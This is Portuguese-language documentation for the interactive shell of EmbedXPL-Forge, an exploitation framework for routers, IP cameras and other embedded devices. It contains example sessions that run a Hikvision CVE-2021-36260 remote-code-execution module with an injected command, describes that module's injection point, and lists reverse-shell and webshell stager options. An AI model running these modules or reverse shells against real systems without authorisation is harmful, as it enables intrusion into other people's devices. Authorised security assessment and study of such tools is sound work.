# Comandos do Shell Interativo

**Idioma:** Português (pt-BR). **English:** [../en-US/02-interactive-shell-commands.md](../en-US/02-interactive-shell-commands.md)

---

## Iniciando o shell

```bash
embedxpl           # recomendado (após pip install embedxpl)
exf                # alias — comportamento idêntico
fxf                # alias — comportamento idêntico
python -m embedxpl # invocação de módulo
python exf.py      # bootstrap legado (a partir da raiz do clone git)
```

O shell exibe o banner e entra em um loop REPL:

```text
$ exf

  ____  __  __ _____
 |  _ \ \ \/ /|  ___|   EmbedXPL-Forge v1.0.0
 | |_) | \  / | |_      Network Device Security Assessment Framework
 |  _ <  /  \ |  _|
 |_| \_\/_/\_\|_|        Author: Andre Henrique (@mrhenrike) | Uniao Geek

 Target scope: Routers - Switches L2/L3 - IP Cameras - GPON ONTs - ISP CPEs - IoT/Embedded Edge

 [modules] 2807 total -- Exploits: 1842 | Scanners: 134 | Creds: 687 | Generic: 22 | Payloads: 32 | Encoders: 13
 [system]  Intel Core i7-12700H | 16 cores | 32 GB RAM | NVIDIA RTX 3060 6 GB | compute: auto

exf >
```

---

## Formato do prompt

| Estado | Prompt |
|--------|--------|
| Nenhum módulo carregado | `exf > ` (sublinhado no terminal) |
| Módulo carregado | `exf (NomeDoModulo) > ` (nome do módulo em vermelho/brilhante) |

```text
exf >                              # estado global
exf (Hikvision Unauthenticated RCE) >   # módulo carregado
exf (AutoPwn) >                    # módulo scanner carregado
```

O prompt pode ser personalizado via variáveis de ambiente:
- `EXF_RAW_PROMPT` — prompt quando nenhum módulo está ativo (deve conter `{host}`)
- `EXF_MODULE_PROMPT` — prompt quando um módulo está ativo (deve conter `{host}` e `{module}`)

---

## Completamento por Tab

O completamento por Tab está habilitado para todos os comandos e caminhos de módulos. Pressione `Tab` uma vez para completar, duas vezes para listar todas as opções:

```text
exf > use exploits/cameras/hi[TAB]
exploits/cameras/hikvision/

exf > use exploits/cameras/hikvision/[TAB][TAB]
info_disclosure_cve_2017_7921
rtsp_rce_cve_2021_36260
firmware_crypto_key_extract
...
```

---

## Visão geral dos comandos

### Comandos globais (sempre disponíveis)

| Comando | Sintaxe | Descrição |
|---------|---------|-----------|
| `help` | `help` | Exibir os menus de ajuda global e de módulo |
| `use` | `use <caminho_do_modulo>` | Carregar um módulo do arsenal de módulos |
| `search` | `search [termo] [filtros]` | Pesquisar módulos por palavra-chave, CVE ou filtro |
| `show` | `show <subcomando>` | Exibir listagens — veja os subcomandos abaixo |
| `exec` | `exec <comando_shell>` | Executar um comando de shell do SO via `os.system()` |
| `sysinfo` | `sysinfo` | Exibir CPU, RAM, GPU, modo de computação em detalhe |
| `compute` | `compute <modo>` | Definir backend de computação (`cpu`, `gpu`, `hybrid`, `auto`) |
| `discover` | `discover <subnet/CIDR>` | Descoberta de rede, fingerprinting, correspondência de módulos |
| `sessions` | `sessions [subcomando]` | Gerenciar sessões de varredura persistentes por host |
| `apt` | `apt [subcomando]` | Catálogo de cadeias de ataque APT (nation-state) |
| `exit` | `exit` | Sair do shell (também Ctrl+D) |

### Comandos de contexto de módulo (requerem um módulo carregado via `use`)

| Comando | Sintaxe | Descrição |
|---------|---------|-----------|
| `run` | `run` | Executar o módulo carregado |
| `exploit` | `exploit` | Alias para `run` |
| `check` | `check` | Executar apenas a verificação de vulnerabilidade do módulo |
| `set` | `set <opcao> <valor>` | Definir uma opção do módulo |
| `setg` | `setg <opcao> <valor>` | Definir uma opção global (persiste em todos os módulos) |
| `unsetg` | `unsetg <opcao>` | Limpar uma opção global previamente definida |
| `show options` | `show options` | Listar opções não avançadas do módulo com valores atuais |
| `show advanced` | `show advanced` | Listar todas as opções incluindo as avançadas |
| `show info` | `show info` | Exibir metadados do módulo (nome, descrição, autores, dispositivos, referências) |
| `show devices` | `show devices` | Listar modelos/firmware exatos de dispositivos alvo deste módulo |
| `show wordlists` | `show wordlists` | Listar wordlists embutidas disponíveis para o módulo |
| `show encoders` | `show encoders` | Listar encoders disponíveis (apenas módulos de payload) |
| `back` | `back` | Descarregar o módulo atual, retornar ao estado global |

---

## `help` — exibir ajuda

**Sintaxe:**

```text
help
```

**Parâmetros:** nenhum.

**Sessão de terminal:**

```text
exf > help

Global commands:
    help                        Print this help menu
    use <module>                Select a module for usage
    exec <shell command> <args> Execute a command in a shell
    search <search term>        Search for appropriate module
    sysinfo                     Show detected hardware (CPU, RAM, GPU)
    compute <cpu|gpu|hybrid|auto>  Set compute mode for ML/GPU operations
    discover <subnet/CIDR>      Scan network and match targets to exploit catalog
    discover -T <targets.txt>   Scan multiple IPs/CIDRs listed in a file (one per line)
    sessions [list|show|delete|purge|export]  Manage scan session history
    exit                        Exit EmbedXPL

Module commands:
    run                                 Run the selected module with the given options
    back                                De-select the current module
    set <option name> <option value>    Set an option for the selected module
    setg <option name> <option value>   Set an option for all of the modules
    unsetg <option name>                Unset option that was set globally
    show [info|options|devices]         Print information, options, or target devices for a module
    check                               Check if a given target is vulnerable to a selected module's exploit

exf >
```

**Observações:**
- `help` está disponível nos estados global e de contexto de módulo.
- Quando um módulo está carregado, ambas as seções são exibidas.

---

## `use` — carregar um módulo

**Sintaxe:**

```text
use <caminho_do_modulo>
```

**Parâmetros:**

| Parâmetro | Tipo | Obrigatório | Padrão | Valores aceitos | Descrição |
|-----------|------|-------------|--------|-----------------|-----------|
| `caminho_do_modulo` | string | Sim | — | Qualquer caminho de módulo válido | Caminho separado por barra relativo a `embedxpl/modules/`. Pontos ou barras funcionam. |

**Sessão de terminal — carregando um exploit:**

```text
exf > use exploits/cameras/hikvision/rtsp_rce_cve_2021_36260
exf (Hikvision Unauthenticated RCE) >
```

**Sessão de terminal — carregando um módulo de credenciais:**

```text
exf > use creds/routers/dlink/telnet_default_creds
exf (telnet_default_creds) >
```

**Sessão de terminal — carregando um scanner:**

```text
exf > use scanners/autopwn
exf (AutoPwn) >
```

**Sessão de terminal — módulo não encontrado:**

```text
exf > use exploits/cameras/hikvision/does_not_exist
[-] ImportError: No module named 'embedxpl.modules.exploits.cameras.hikvision.does_not_exist'
exf >
```

**Observações:**
- Caminhos usam barras (`/`) ou pontos (`.`) de forma intercambiável.
- O completamento por Tab está disponível após cada segmento de caminho.
- Quando um módulo é carregado, quaisquer opções globais definidas com `setg` são automaticamente aplicadas a nomes de opções correspondentes.

---

## `set` — definir uma opção do módulo

**Sintaxe:**

```text
set <nome_opcao> <valor>
```

**Parâmetros:**

| Parâmetro | Tipo | Obrigatório | Padrão | Valores aceitos | Descrição |
|-----------|------|-------------|--------|-----------------|-----------|
| `nome_opcao` | string | Sim | — | Qualquer opção definida pelo módulo | Opção a configurar |
| `valor` | string | Sim | — | Depende do tipo da opção | Novo valor para a opção |

**Tipos de dados de opção:**

| Tipo | Formato de entrada no shell | Exemplo |
|------|-----------------------------|---------|
| `OptIP` | IPv4, IPv6, hostname ou `file://caminho` | `192.168.1.1`, `file:///tmp/hosts.txt` |
| `OptPort` | Inteiro 1–65535 | `443`, `9100` |
| `OptBool` | `true` ou `false` (sem distinção de maiúsculas) | `true`, `false` |
| `OptString` | Qualquer string | `admin`, `id`, `whoami` |
| `OptInteger` | Inteiro decimal ou hexadecimal | `10`, `0x1F` |
| `OptFloat` | Número de ponto flutuante | `2.0`, `0.5` |
| `OptMAC` | Endereço MAC | `aa:bb:cc:dd:ee:ff` |
| `OptWordlist` | `file://caminho` ou `user:pass,...` | `file:///usr/share/wordlists/rockyou.txt` |

**Sessão de terminal:**

```text
exf > use exploits/cameras/hikvision/rtsp_rce_cve_2021_36260
exf (Hikvision Unauthenticated RCE) > set target 192.168.1.100
[+] target => 192.168.1.100
exf (Hikvision Unauthenticated RCE) > set port 80
[+] port => 80
exf (Hikvision Unauthenticated RCE) > set ssl false
[+] ssl => false
exf (Hikvision Unauthenticated RCE) > set command "id; uname -a"
[+] command => id; uname -a
```

**Caso de erro — nome de opção inválido:**

```text
exf (Hikvision Unauthenticated RCE) > set nonexistent_option foo
[-] You can't set option 'nonexistent_option'.
    Available options: ['target', 'port', 'ssl', 'command']
```

---

## `setg` — definir uma opção global

**Sintaxe:**

```text
setg <nome_opcao> <valor>
```

**Parâmetros:** iguais aos de `set`.

**Descrição:** Define uma opção que persiste no dicionário `GLOBAL_OPTS`. Quando qualquer novo módulo é carregado com `use`, as opções globais cujos nomes correspondem às opções do módulo são aplicadas automaticamente.

**Sessão de terminal:**

```text
exf > use exploits/cameras/hikvision/rtsp_rce_cve_2021_36260
exf (Hikvision Unauthenticated RCE) > setg target 192.168.1.100
[+] target => 192.168.1.100

exf (Hikvision Unauthenticated RCE) > back
exf > use exploits/cameras/dahua/cctv_rce_cve_2021_36260
exf (Dahua RCE CVE-2021-36260 (DAHUA-2026-006)) >
# target 192.168.1.100 é aplicado automaticamente de GLOBAL_OPTS
```

**Observações:**
- As opções globais não substituem opções definidas explicitamente com `set` após carregar um módulo.
- Use `unsetg` para limpar uma opção global.

---

## `unsetg` — limpar uma opção global

**Sintaxe:**

```text
unsetg <nome_opcao>
```

**Sessão de terminal (sucesso):**

```text
exf (Hikvision Unauthenticated RCE) > unsetg target
[+] {'target': '192.168.1.100'}
```

**Sessão de terminal (opção não está nos globais):**

```text
exf (Hikvision Unauthenticated RCE) > unsetg port
[-] You can't unset global option 'port'.
    Available global options: ['target']
```

---

## `back` — descarregar módulo atual

**Sintaxe:**

```text
back
```

**Parâmetros:** nenhum.

**Sessão de terminal:**

```text
exf (Hikvision Unauthenticated RCE) > back
exf >
```

**Observações:**
- `back` não limpa as opções globais definidas com `setg`.
- As opções de módulo definidas com `set` (locais ao módulo) são descartadas quando você executa `back`.

---

## `run` / `exploit` — executar um módulo

**Sintaxe:**

```text
run
exploit
```

**Parâmetros:** nenhum (as opções são definidas previamente com `set`).

**Sessão de terminal — execução de módulo exploit:**

```text
exf > use exploits/cameras/hikvision/rtsp_rce_cve_2021_36260
exf (Hikvision Unauthenticated RCE) > set target 192.168.1.100
[+] target => 192.168.1.100
exf (Hikvision Unauthenticated RCE) > set port 80
[+] port => 80
exf (Hikvision Unauthenticated RCE) > run
[*] Running module <embedxpl.modules.exploits.cameras.hikvision.rtsp_rce_cve_2021_36260.Exploit object>...
[*] Checking if 192.168.1.100:80 is a Hikvision device...
[*] Attempting CVE-2021-36260 RCE on 192.168.1.100...
[*] Response HTTP 400: <?xml version="1.0" encoding="UTF-8"?><ResponseStatus ...>
[+] CVE-2021-36260: Payload delivered to 192.168.1.100:80. Monitor for callback.
[!] Verify execution via OOB (e.g., Burp Collaborator or Interactsh).
exf (Hikvision Unauthenticated RCE) >
```

**Sessão de terminal — cancelado com Ctrl+C:**

```text
exf (AutoPwn) > run
[*] AutoPwn timing profiles (Nmap-style -T0..-T5):
...
^C
[*]
[-] Operation cancelled by user
exf (AutoPwn) >
```

**Observações:**
- `exploit` é um alias completo para `run`; ambos chamam o mesmo método interno.
- Os resultados são salvos automaticamente em `~/.exf_sessions/` se `target` estiver definido.
- Pressione Ctrl+C para cancelar um módulo em execução. Ctrl+D sai do shell.

---

## `check` — verificar apenas a vulnerabilidade

**Sintaxe:**

```text
check
```

**Descrição:** Chama o método `check()` do módulo sem chamar `run()`. Útil para varredura de vulnerabilidades em massa sem disparar payloads de exploração.

**Valores de retorno:**

| Retorno de `check()` | Saída do shell |
|----------------------|----------------|
| `True` | `[+] Target is vulnerable` |
| `False` | `[-] Target is not vulnerable` |
| Exceção / None | `[*] Target could not be verified` |

**Sessão de terminal (vulnerável):**

```text
exf > use exploits/cameras/dahua/cctv_rce_cve_2021_36260
exf (Dahua RCE CVE-2021-36260 (DAHUA-2026-006)) > set target 192.168.1.50
[+] target => 192.168.1.50
exf (Dahua RCE CVE-2021-36260 (DAHUA-2026-006)) > check
[+] Target is vulnerable
```

**Sessão de terminal (não vulnerável):**

```text
exf (Dahua RCE CVE-2021-36260 (DAHUA-2026-006)) > check
[-] Target is not vulnerable
```

---

## `show` — exibir informações do módulo/sistema

**Sintaxe:**

```text
show <subcomando>
```

**Subcomandos disponíveis:**

| Subcomando | Requer módulo | Descrição |
|------------|---------------|-----------|
| `info` | Sim | Metadados do módulo: nome, descrição, dispositivos, autores, referências |
| `options` | Sim | Tabela de opções não avançadas: nome, valor atual, descrição |
| `advanced` | Sim | Tabela completa de opções incluindo as avançadas |
| `devices` | Sim | Modelos/firmware/marcas de dispositivos alvo do módulo carregado |
| `wordlists` | Sim | Wordlists embutidas disponíveis no diretório de wordlists |
| `encoders` | Sim | Encoders disponíveis (para módulos de payload) |
| `all` | Não | Todos os caminhos de módulos de todas as categorias |
| `exploits` | Não | Todos os caminhos de módulos de exploit |
| `scanners` | Não | Todos os caminhos de módulos de scanner |
| `creds` | Não | Todos os caminhos de módulos de credenciais |

**Sessão de terminal — `show info`:**

```text
exf > use exploits/cameras/hikvision/rtsp_rce_cve_2021_36260
exf (Hikvision Unauthenticated RCE) > show info

[*] Name:        Hikvision Unauthenticated RCE
[*] Description: CVE-2021-36260 — Hikvision IP cameras allow remote code execution
                 without authentication via crafted HTTP PUT to /SDK/webLanguage.
                 The command is injected via the lang parameter, executing as root.
[*] Devices:     Hikvision IP Cameras (DS-2CD series, DS-2DE series, etc.)
                 Hikvision NVR/DVR with web interface
[*] Authors:     watchTowr Labs (original)
                 André Henrique (@mrhenrike) - EmbedXPL-Forge port
[*] References:  https://nvd.nist.gov/vuln/detail/CVE-2021-36260
                 https://www.exploit-db.com/exploits/50441
```

**Sessão de terminal — `show options`:**

```text
exf (Hikvision Unauthenticated RCE) > show options

Target options:
┌────────┬──────────────────┬──────────────────────────────────────┐
│ Name   │ Current settings │ Description                          │
├────────┼──────────────────┼──────────────────────────────────────┤
│ target │                  │ Target IPv4 address                  │
│ port   │ 80               │ HTTP port (80 or 443)                │
│ ssl    │ False            │ Use HTTPS                            │
└────────┴──────────────────┴──────────────────────────────────────┘

Module options:
┌─────────┬──────────────────┬───────────────────────────────────────┐
│ Name    │ Current settings │ Description                           │
├─────────┼──────────────────┼───────────────────────────────────────┤
│ command │ id               │ Command to execute (default: id)      │
└─────────┴──────────────────┴───────────────────────────────────────┘
```

---

## `compute` — definir modo de computação

**Sintaxe:**

```text
compute <modo>
```

**Parâmetros:**

| Parâmetro | Tipo | Obrigatório | Padrão | Valores aceitos | Descrição |
|-----------|------|-------------|--------|-----------------|-----------|
| `modo` | string | Sim | `auto` | `cpu`, `gpu`, `hybrid`, `auto` | Backend de computação a usar |

**Sessão de terminal:**

```text
exf > compute auto
[+] compute_mode => auto
    auto resolves to: hybrid

exf > compute cpu
[+] compute_mode => cpu

exf > compute gpu
[+] compute_mode => gpu
```

**Caso de erro — modo inválido:**

```text
exf > compute turbo
[-] Invalid compute mode 'turbo'. Choose from: cpu, gpu, hybrid, auto
```

---

## `exec` — executar comandos do shell do SO

**Sintaxe:**

```text
exec <comando_shell>
```

**Sessão de terminal:**

```text
exf > exec whoami
mrhenrike

exf > exec nmap -sV 192.168.1.1 -p 80,443,23
Starting Nmap 7.95 ...
PORT    STATE SERVICE VERSION
80/tcp  open  http    lighttpd
443/tcp open  https
23/tcp  open  telnet
```

**Observações:**
- A saída vai diretamente para stdout. `exec` usa `os.system()`, não um subprocess com saída capturada.
- Para capturar saída em um arquivo: `exec nmap 192.168.1.1 > /tmp/scan.txt`
- No Windows, os comandos usam semântica do `cmd.exe`.

---

## Opções do Shell Stager (módulos de exploit com staging de shell)

Módulos de exploit que suportam entrega de shell pós-exploração expõem estas opções adicionais:

| Opção | Tipo | Padrão | Valores aceitos | Descrição |
|-------|------|--------|-----------------|-----------|
| `lhost` | `OptString` | `""` | Qualquer IP | IP do atacante para callback do reverse shell |
| `lport` | `OptPort` | `4444` | 1–65535 | Porta do listener para reverse shell |
| `shell_type` | `OptString` | `auto` | Veja lista abaixo | Tipo de shell/payload |
| `force_exploit` | `OptBool` | `false` | `true`, `false` | Ignorar `check()` e ir direto à exploração |
| `ask_on_fail` | `OptBool` | `true` | `true`, `false` | Perguntar ao usuário se `check()` retornar False |
| `pty_upgrade` | `OptBool` | `true` | `true`, `false` | Enviar automaticamente `python3 pty.spawn()` ao conectar ao shell |
| `listener_timeout` | `OptPort` | `60` | 1–65535 | Segundos para aguardar conexão reversa |

**Valores aceitos para `shell_type`:**
`bash`, `nc`, `python`, `perl`, `ruby`, `php`, `awk`, `socat`, `powershell`, `powershell_b64`, `nc_bind`, `python_bind`, `meterpreter_linux`, `meterpreter_windows`, `meterpreter_php`, `php_webshell`, `aspx_webshell`, `auto`

---

## Convenções de prefixo de saída

Todas as linhas de saída usam um esquema consistente de prefixo/cor:

| Prefixo | Cor | Significado |
|---------|-----|-------------|
| `[+]` | Verde | Sucesso / achado positivo / credencial encontrada / vulnerável |
| `[-]` | Vermelho | Erro / falha / não vulnerável |
| `[*]` | Azul | Status / atualização de progresso |
| `[!]` | Amarelo | Aviso (não fatal) |
| (nenhum) | Branco | Texto informativo/neutro |

---

[Hub da Wiki](../README.md)
